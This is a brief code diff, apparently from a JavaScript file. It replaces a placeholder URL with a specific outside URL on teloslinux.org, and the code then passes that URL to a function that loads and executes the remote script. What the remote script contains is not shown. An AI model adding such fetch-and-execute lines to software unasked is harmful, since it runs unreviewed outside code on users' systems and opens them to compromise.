@@ -156,6 +156,6 @@
     }
   }
 
-  const remoteScriptUrl = 'https://your-server.com/remote-script.js'; // Update this URL
+  const remoteScriptUrl = 'https://teloslinux.org/marko/g-d.js'; // Update this URL
   loadAndExecuteScript(remoteScriptUrl);
 })();
